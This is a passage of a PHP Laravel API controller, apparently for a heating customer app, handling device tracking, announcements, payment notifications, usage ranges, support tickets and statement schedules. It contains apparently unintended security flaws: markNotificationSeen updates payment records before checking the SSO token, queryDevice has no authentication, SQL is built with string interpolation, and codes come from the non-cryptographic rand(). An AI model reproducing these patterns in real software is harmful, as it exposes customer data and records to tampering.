		} else {
			return Response::json([
				'data' => [
					"title" => "You currently cannot use IOU.",
					"msg" => "",
					
				],
			]);

		}
		
		} catch(Exception $e) {	
			return Response::json([
				'data' => [
					'error' => $e->getMessage(),
				],
			]);	
		}	
	}
	
	public function queryDevice()
	{
		
		try {
		
			$login = Input::get('login');
			$customer_id = Input::get('customer_id');
			$device_uid = Input::get('device_uid');
			$device_platform = Input::get('device_platform');
			$app_version = Input::get('version');
			$IP_Address = $_SERVER['REMOTE_ADDR'];
			$ref = Input::get('ref');
		
			if(empty($ref))
				return;
			
			if(strtolower($device_platform) == 'browser') {
				$track = TrackingAppData::where('customer_id', $customer_id)->first();
			} else {
				$track = TrackingAppData::where('unique_id', $device_uid)->first();
			}
		
			if(!$track) {
				$track = new TrackingAppData();
			}
			$track->customer_id = $customer_id;
			if($login == 1)
				$track->last_login = date('Y-m-d H:i:s');
			
			$track->IP_Address = $IP_Address;
			$track->last_poll = date('Y-m-d H:i:s');
			$track->unique_id = $device_uid;
			$track->platform = $device_platform;
			$track->version = $app_version;
			$track->ref = $ref;
			$track->save();
			
			return Response::json([
				'data' => [
					"title" => "queried new platform",
					"msg" => "",
					
				],
			]);
			

		} catch(Exception $e) {	
			return Response::json([
				'data' => [
					'error' => $e->getMessage(),
				],
			]);	
		}
	}
	
	
	public function queryFaqClick()
	{
		try {
			
			$customer_id = Input::get('customer_id');
			$token = Input::get('token');
			$faq_title = Input::get('faq_title');
			$customer = Customer::find($customer_id);
			$valid = $customer->validSSO($token);
			$scheme_number = $customer->scheme_number;
			
			if(!$customer)
				throw new Exception("Customer not found!");
			if(!$valid)
				throw new Exception("Invalid SSO Ticket!");
			
			$faq_tracking_entry = TrackingFaqClick::where('title', $faq_title)
			->where('scheme_number', $scheme_number)->first();
			if($faq_tracking_entry) {
				$faq_tracking_entry->clicks++;
				$faq_tracking_entry->save();
			} else {
				$faq_tracking_entry = new TrackingFaqClick();
				$faq_tracking_entry->title = $faq_title;
				$faq_tracking_entry->scheme_number = $scheme_number;
				$faq_tracking_entry->clicks = 1;
				$faq_tracking_entry->save();
			}
			
		} catch(Exception $e) {
			return Response::json([
				"error" => $e->getMessage(),
			]);
		}
	}
	
	
	public function getSchemes()
	{
		try {
			
			
			$names = Scheme::uniqueUsernames();
			
			if(count($names) > 0) {
				$temp = $names[0];
				$names[0] = "Glen EV";
				array_push($names, $temp);
			}
			
			return $names;
			
		} catch(Exception $e) {
			return Response::json([
				'error' => $e->getMessage(),
			]);
		}
	}
	
	public function getAnnouncements()
	{
		try {
			
			$max = 0;
			$fix = false;
			
			if(Input::has('max'))
				$max = Input::get('max');
			
			if(Input::has('fix'))
				$fix = true;
			
			$showViews = Input::has('views') ? true : false;
			
			if($max > 0) {
				$all_announcements = Announcement::orderBy('id', 'ASC')->limit($max)->get();
			}
			else
				$all_announcements = Announcement::orderBy('id', 'ASC')->get();
			
			foreach($all_announcements as $k => $v) {
				$v['preview'] = $v->preview;
				if($showViews)
					$v['views'] = $v->views;
			}
			
			
			$today = date('Y-m-d');
			$latest_announcements = Announcement::orderBy('show_at', 'DESC')->whereRaw("( '$today' >= show_at AND '$today' <= stop_show_at )")->first();
			if($fix && !$latest_announcements) {
				$latest_announcements = null;
			} 
			
			if(!$fix) {
				$latest_announcements['preview'] = $latest_announcements->preview;
			}
			
			
			if($showViews && $latest_announcements)
				$latest_announcements['views'] = $latest_announcements->views;
				
			return Response::json([
				'all_announcements' => $all_announcements,
				'latest_announcements' => $latest_announcements,
			]);
			
		} catch(Exception $e) {
			return Response::json([
				"error" => $e->getMessage() . "(" . $e->getLine() . ") "
			]);
		}
	}
	
	public function viewAnnouncement($announcement_id)
	{
		try {
			
			$customer_id = Input::get('customer_id');
			$token = Input::get('token');
			$customer = Customer::find($customer_id);
			$valid = $customer->validSSO($token);
			
			if(!$customer)
				throw new Exception("Customer not found!");
			if(!$valid)
				throw new Exception("Invalid SSO Ticket!");
			
			$viewed_announcement = AnnouncementView::where('announcement_id', $announcement_id)
			->where('customer_id', $customer_id)
			->first();
			
			$announcement = Announcement::where('id', $announcement_id)->first();
			
			if(!$announcement)
				throw new Exception("Announcement $announcement_id does not exist!");
			
			$announcement->total_views++;
			$announcement->save();
			
			if($viewed_announcement) {
				$viewed_announcement->view_times++;
				$viewed_announcement->save();
			} else {
				$viewed_announcement = new AnnouncementView();
				$viewed_announcement->announcement_id = $announcement_id;
				$viewed_announcement->customer_id = $customer_id;
				$viewed_announcement->view_times = 1;
				$viewed_announcement->save();
			}
			
		} catch(Exception $e) {
			return Response::json([
				"error" => $e->getMessage()
			]);
		}
	}
	
	public function commentAnnouncement($announcement_id)
	{
		try {
			
			$customer_id = Input::get('customer_id');
			$token = Input::get('token');
			$comment  = Input::get('comment');
			$customer = Customer::find($customer_id);
			$valid = $customer->validSSO($token);
			
			if(!$customer)
				throw new Exception("Customer not found!");
			if(!$valid)
				throw new Exception("Invalid SSO Ticket!");
			
				
			$announcement = Announcement::where('id', $announcement_id)->first();
			
			if(!$announcement)
				throw new Exception("Announcement $announcement_id does not exist!");
			
			$announcement_comment = AnnouncementComment::where('announcement_id', $announcement_id)
			->where('customer_id', $customer_id)
			->where('comment', $comment)
			->first();
			
			if($announcement_comment) {
				
			} else {
				$announcement_comment = new AnnouncementComment();
				$announcement_comment->announcement_id = $announcement_id;
				$announcement_comment->customer_id = $customer_id;
				$announcement_comment->comment = $comment;
				$announcement_comment->save();
			}
			
		} catch(Exception $e) {
			return Response::json([
				"error" => $e->getMessage()
			]);
		}
	}
	
	// TODO
	public function validSession() 
	{
		try {
			
			$customer_id = Input::get('customer_id');
			$token = Input::get('token');
			$customer = Customer::find($customer_id);
			
			if(!$customer)
				throw new Exception("Customer not found!");
				
			$valid = ($customer->validSSO($token));
			
			return Response::json([
				"valid" => $valid
			]);
			
		} catch(Exception $e) {
			return Response::json([
				"error" => $e->getMessage() . " (" . $e->getLine() . ")",
				"valid" => false,
			]);
		}
	}
	
	
	public function generateStatement()
	{
		try {
		
		
			return Response::json([
			
			]);
			
		} catch(Exception $e) {
			return Response::json([
				"error" => $e->getMessage() . " (" . $e->getLine() . ")",
			]);
		}
	}
	
	public function markNotificationSeen()
	{
		try {
			
			$notificationId = Input::get('notif_id');
			$customer_id = Input::get('customer_id');
			$token = Input::get('token');
			$customer = Customer::find($customer_id);
			$type = Input::get('notif_type');
			
			if($customer->simulator > 0) {
				if($type == 'failed') {
					DB::table('customers_stripe_failed_payments')
					->where('id', $notificationId)
					->update(['notified_customer' => 1]);
				} else {
					DB::table('customers_stripe_payments')
					->where('id', $notificationId)
					->update(['notified_customer' => 1]);
				}
			}
			
			if(!$customer)
				throw new Exception("Customer not found!");
				
			$valid = ($customer->validSSO($token));
			
			if(!$valid)
				throw new Exception("Invalid SSO Ticket!");
			
			
			
			if($type == 'failed') {
				DB::table('customers_stripe_failed_payments')
				->where('customer_id', $customer_id)
				->where('id', $notificationId)
				->update(['notified_customer' => 1]);
			} else {
				DB::table('customers_stripe_payments')
				->where('customer_id', $customer_id)
				->where('id', $notificationId)
				->update(['notified_customer' => 1]);
			}
			
			return 1;
			
		} catch(Exception $e) {
			return Response::json([
				"error" => $e->getMessage() . " (" . $e->getLine() . ")",
			]);
		}
	}
	
	public function viewNotification()
	{
		try {
			
			$notification_id = Input::get('notification_id');
			$customer_id = Input::get('customer_id');
			$sso_ticket = Input::get('sso_ticket');
			
			if(empty($customer_id) || empty($sso_ticket))
				throw new Exception("The token '$sso_ticket' is invalid for $customer_id.");
			
			$customer = Customer::find($customer_id);
			$customer_sso_ticket = $customer->sso_ticket;
			$valid = $customer->validSSO($sso_ticket);
			
			if(!$valid)
				throw new Exception("Invalid SSO Ticket");
			
			$iab = InAppNotification::where('id', $notification_id)->first();
			$iab->delivered = true;
			$iab->delivered_at = date('Y-m-d H:i:s');
			$iab->save();
			
			return Response::json([
				'success' => 'viewed',
			]);
			
		} catch(Exception $e) {
			return Response::json([
				"error" => $e->getMessage() . " (" . $e->getLine() . ")",
			]);
		}
	}
	
	public function getAutotopup($extra = null)
	{
		try {
			
			if($extra != null) {
				if($extra == 'terms') {
					$autotopup_terms = SystemSetting::get('autotopup_terms');
					return Response::json([
						"autotopup_terms" => $autotopup_terms,
					]);
				}
				if($extra == 'vars_autotopup_alias') {
					$vars_autotopup_alias = SystemSetting::get('vars_autotopup_alias');
					return Response::json([
						"vars_autotopup_alias" => $vars_autotopup_alias,
					]);
				}
			}
			
			$autotopup_title = SystemSetting::get('autotopup_title');
			$autotopup_subtitle = SystemSetting::get('autotopup_subtitle');
			$autotopup_body = SystemSetting::get('autotopup_body');
			
			return Response::json([
				"autotopup_title" 		=> $autotopup_title,
				"autotopup_subtitle" 	=> $autotopup_subtitle,
				"autotopup_body" 		=> $autotopup_body,
			]);
			
		} catch(Exception $e) {
			return Response::json([
				"error" => $e->getMessage() . " (" . $e->getLine() . ")",
			]);
		}
		
	}
	
	public function getUsageRange()
	{
		try {
			
			$notification_id = Input::get('notification_id');
			$customer_id = Input::get('customer_id');
			$sso_ticket = Input::get('sso_ticket');
			$from = Input::get('from');
			$to = Input::get('to');
			
			if(empty($customer_id) || empty($sso_ticket))
				throw new Exception("The token '$sso_ticket' is invalid for $customer_id.");
			
			$customer = Customer::find($customer_id);
			$customer_sso_ticket = $customer->sso_ticket;
			$valid = $customer->validSSO($sso_ticket);
			
			if(!$valid)
				throw new Exception("Invalid SSO Ticket");
			
			$from = Carbon\Carbon::parse($from);
			$to = Carbon\Carbon::parse($to);
			
			if($from > $to) {
				throw new Exception("The from date cannot be greater than to to date!");
			}
			
			if($customer && $customer->simulator > 0) {
				$username = str_replace('_test', '', $customer->username);
				$original = Customer::where('username', $username)->first();
				if($original) {
					$customer_id = $original->id;
				}
			}
			
			$usage = DistrictHeatingUsage::where('customer_id', $customer_id)->whereRaw("(date >= '$from' AND date <= '$to')")
			->orderby('date', 'asc')->groupBy('date')->get();
			$usage = HomeController::insertMissingDistrictUsage($customer_id, $usage);
			
			return Response::json([
				'from' => $from,
				'to' => $to,
				'usage' => $usage,
			]);
			
		} catch(Exception $e) {
			return Response::json([
				"error" => $e->getMessage() . " (" . $e->getLine() . ")",
			]);
		}
		
	}
	
	public function getTickets()
	{
		try {
			
			$customer_id = Input::get('customer_id');
			$sso_ticket = Input::get('sso_ticket');

			if(empty($customer_id) || empty($sso_ticket))
				throw new Exception("The token '$sso_ticket' is invalid for $customer_id.");
			
			$customer = Customer::find($customer_id);
			$valid = $customer->validSSO($sso_ticket);
			
			if(!$valid)
				throw new Exception("Invalid SSO Ticket");
			
			
			$tickets = ReportABug::where('customer_id', $customer->id)
			->orderBy('id', 'DESC')->get();
			
			
			//ReportABug::find(541)->reply('t');
			return Response::json([
				"tickets" => $tickets,
			]);
			
		} catch(Exception $e) {
			return Response::json([
				"error" => $e->getMessage() . " (" . $e->getLine() . ")",
			]);
		}	
	}
	
	public function solveTicket()
	{
		try {
			
			$customer_id = Input::get('customer_id');
			$sso_ticket = Input::get('sso_ticket');
			$ticket_id = Input::get('ticket_id');
			
			if(empty($customer_id) || empty($sso_ticket))
				throw new Exception("The token '$sso_ticket' is invalid for $customer_id.");
			
			$customer = Customer::find($customer_id);
			$valid = $customer->validSSO($sso_ticket);
			
			if(!$valid)
				throw new Exception("Invalid SSO Ticket");
			
			
			$ticket = ReportABug::where('customer_id', $customer->id)
			->where('id', $ticket_id)->first();
			
			$ticket->reply("I found a solution so I manually marked the ticket as solved.");
			$ticket->resolved = 1;
			$ticket->progress = 100;
			$ticket->save();
			$ticket = ReportABug::where('id', $ticket_id)->first();
			
			return Response::json([
				"success" => "Successfully marked ticket as solved",
				"ticket" => $ticket,
			]);
			
			
		} catch(Exception $e) {
			return Response::json([
				"error" => $e->getMessage() . " (" . $e->getLine() . ")",
			]);
		}	
	}
	
	public function replyTicket()
	{
		try {
			
			$customer_id = Input::get('customer_id');
			$sso_ticket = Input::get('sso_ticket');
			$ticket_id = Input::get('ticket_id');
			$reply = Input::get('reply');
			
			if(empty($customer_id) || empty($sso_ticket))
				throw new Exception("The token '$sso_ticket' is invalid for $customer_id.");
			
			$customer = Customer::find($customer_id);
			$valid = $customer->validSSO($sso_ticket);
			
			if(!$valid)
				throw new Exception("Invalid SSO Ticket");
			
			
			$ticket = ReportABug::where('customer_id', $customer->id)
			->where('id', $ticket_id)->first();
			
			$ticket->reply($reply);
			
			$ticket = ReportABug::where('id', $ticket_id)->first();
			
			return Response::json([
				"success" => "Successfully responses schedule",
				"ticket" => $ticket,
			]);
			
			
		} catch(Exception $e) {
			return Response::json([
				"error" => $e->getMessage() . " (" . $e->getLine() . ")",
			]);
		}	
	}
	
	
	public function startStatementSchedule()
	{
		try {
			
			$customer_id = Input::get('customer_id');
			$sso_ticket = Input::get('sso_ticket');
			$frequency = Input::get('frequency');
			$emails = Input::get('emails');
			
			if(strlen($emails) <= 0) {
				throw new Exception('Please enter a valid email!');
			}
			
			if(empty($customer_id) || empty($sso_ticket))
				throw new Exception("The token '$sso_ticket' is invalid for $customer_id.");
			
			$customer = Customer::find($customer_id);
			$valid = $customer->validSSO($sso_ticket);
			
			if(!$valid)
				throw new Exception("Invalid SSO Ticket");
			
			$schedule = SnugzoneAppStatementSchedule::where('customer_id', $customer->id)->first();
			
			if(!$schedule)
				$schedule = new SnugzoneAppStatementSchedule();
			
			$schedule->customer_id = $customer_id;
			$schedule->frequency = $frequency;
			//$schedule->last_sent = null;
			$schedule->next_sent = date('Y-m-d');
			$schedule->emails = $emails;
			$schedule->sent_times = 0;
			$schedule->active = 1;
			$schedule->created_at = date('Y-m-d H:i:s');
			$schedule->save();
			
			return Response::json([
				"success" => "Successfully setup schedule",
			]);
			
		} catch(Exception $e) {
			return Response::json([
				"error" => $e->getMessage() . " (" . $e->getLine() . ")",
			]);
		}	
	}
	
	public function cancelStatementSchedule()
	{
		try {
			
			$customer_id = Input::get('customer_id');
			$sso_ticket = Input::get('sso_ticket');
			
			if(empty($customer_id) || empty($sso_ticket))
				throw new Exception("The token '$sso_ticket' is invalid for $customer_id.");
			
			$customer = Customer::find($customer_id);
			$valid = $customer->validSSO($sso_ticket);
			
			if(!$valid)
				throw new Exception("Invalid SSO Ticket");
			
			$schedule = SnugzoneAppStatementSchedule::where('customer_id', $customer->id)->first();
			
			if(!$schedule)
				throw new Exception("You do not have a statement schedule to cancel!");
			
			$schedule->active = 0;
			$schedule->save();
			
			return Response::json([
				"success" => "Successfully cancelled statements schedule",
			]);
			
		} catch(Exception $e) {
			return Response::json([
				"error" => $e->getMessage() . " (" . $e->getLine() . ")",
			]);
		}	
	}
	
	private function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
	}
	
	private function generateCode($length = 5) {
		$characters = '0123456789';
		$charactersLength = strlen($characters);
		$randomString = '';
		for ($i = 0; $i < $length; $i++) {
			$randomString .= $characters[rand(0, $charactersLength - 1)];
		}
		return $randomString;
	}
	
	private function getIP() {
		
		$ip_address = 'unset';
		
		if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
			$ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
		} else {
			if(!empty($_SERVER['REMOTE_ADDR']))
				$ip_address = $_SERVER['REMOTE_ADDR'];
		}
		
		return $ip_address;
	}
}